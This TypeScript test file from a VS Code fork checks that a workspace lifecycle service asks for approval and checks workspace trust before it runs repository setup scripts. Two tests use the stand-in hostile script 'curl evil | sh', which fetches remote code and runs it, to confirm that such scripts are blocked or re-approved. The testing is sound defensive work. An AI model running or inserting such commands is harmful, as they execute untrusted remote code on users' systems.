/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

// PARA-CODE: fork-owned file (Para Code) — not present in upstream microsoft/vscode. See CLAUDE.md.

import assert from 'assert';
import { VSBuffer } from '../../../../../base/common/buffer.js';
import { URI } from '../../../../../base/common/uri.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { IDialogService } from '../../../../../platform/dialogs/common/dialogs.js';
import { FileService } from '../../../../../platform/files/common/fileService.js';
import { InMemoryFileSystemProvider } from '../../../../../platform/files/common/inMemoryFilesystemProvider.js';
import { ServicesAccessor } from '../../../../../platform/instantiation/common/instantiation.js';
import { ISharedProcessService } from '../../../../../platform/ipc/electron-browser/services.js';
import { NullLogService } from '../../../../../platform/log/common/log.js';
import { InMemoryStorageService, IStorageService } from '../../../../../platform/storage/common/storage.js';
import { IWorkspaceTrustManagementService } from '../../../../../platform/workspace/common/workspaceTrust.js';
import { paradisRunWorkspaceLifecycleScript } from '../../electron-browser/paradisWorkspaceLifecycleService.js';
import { IParadisWorkspaceLifecycleConfig } from '../../common/paradisWorkspaceLifecycle.js';
import { IParadisWorkspaceRepository } from '../../common/paradisWorkspaceSwitch.js';

suite('workspace lifecycle service', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	function createLifecycleFixture(config: IParadisWorkspaceLifecycleConfig, options?: { trusted?: boolean; approve?: boolean }) {
		const fileService = store.add(new FileService(new NullLogService()));
		store.add(fileService.registerProvider('file', store.add(new InMemoryFileSystemProvider())));
		const repository: IParadisWorkspaceRepository = { id: 'repo-1', name: 'repo', uri: URI.file('/repo') };
		const worktreeUri = URI.file('/worktree');

		const calls: unknown[] = [];
		let confirmCount = 0;
		const trustService = { isWorkspaceTrusted: () => options?.trusted ?? true } as IWorkspaceTrustManagementService;
		const dialogService = {
			confirm: async () => {
				confirmCount++;
				return { confirmed: options?.approve ?? true };
			}
		} as unknown as IDialogService;
		const storageService = store.add(new InMemoryStorageService());
		const sharedProcessService = {
			getChannel: () => ({
				call: async (_command: string, arg: unknown) => { calls.push((arg as unknown[])[0]); }
			})
		} as unknown as ISharedProcessService;
		const accessor = {
			get: (id: unknown) => {
				if (id === IWorkspaceTrustManagementService) { return trustService; }
				if (id === ISharedProcessService) { return sharedProcessService; }
				if (id === IDialogService) { return dialogService; }
				if (id === IStorageService) { return storageService; }
				return fileService;
			}
		} as ServicesAccessor;

		return {
			calls,
			get confirmCount() { return confirmCount; },
			async writeConfig(override?: IParadisWorkspaceLifecycleConfig) {
				await fileService.writeFile(URI.file('/repo/.paracode.json'), VSBuffer.fromString(JSON.stringify(override ?? config)));
			},
			async run(kind: 'setup' | 'teardown', override?: IParadisWorkspaceLifecycleConfig) {
				await this.writeConfig(override);
				return paradisRunWorkspaceLifecycleScript(accessor, kind, repository, worktreeUri);
			}
		};
	}

	test('loads parent config and sends setup request after first-run approval', async () => {
		const fixture = createLifecycleFixture({ setupScript: 'bun install' });
		assert.strictEqual(await fixture.run('setup'), true);
		assert.strictEqual(fixture.confirmCount, 1);
		assert.deepStrictEqual(fixture.calls, [{
			kind: 'setup', repoPath: URI.file('/repo').fsPath, worktreePath: URI.file('/worktree').fsPath, script: 'bun install'
		}]);
	});

	test('does not run absent script', async () => {
		const fixture = createLifecycleFixture({});
		assert.strictEqual(await fixture.run('teardown'), false);
		assert.deepStrictEqual(fixture.calls, []);
	});

	test('rejects repository script in an untrusted workspace', async () => {
		const fixture = createLifecycleFixture({ setupScript: 'bun install' }, { trusted: false });
		await assert.rejects(fixture.run('setup'), /Workspace Trust/i);
	});

	test('does not run a script the user declined to approve, without failing the caller', async () => {
		const fixture = createLifecycleFixture({ setupScript: 'curl evil | sh' }, { approve: false });
		assert.strictEqual(await fixture.run('setup'), false);
		assert.strictEqual(fixture.confirmCount, 1);
		assert.deepStrictEqual(fixture.calls, []);
	});

	test('asks approval only once for the same repository, kind and script content', async () => {
		const fixture = createLifecycleFixture({ setupScript: 'bun install' });
		await fixture.run('setup');
		await fixture.run('setup');
		assert.strictEqual(fixture.confirmCount, 1);
		assert.strictEqual(fixture.calls.length, 2);
	});

	test('asks approval again when the script content changes', async () => {
		const fixture = createLifecycleFixture({ setupScript: 'bun install' });
		await fixture.run('setup');
		await fixture.run('setup', { setupScript: 'bun install && curl evil | sh' });
		assert.strictEqual(fixture.confirmCount, 2);
	});
});
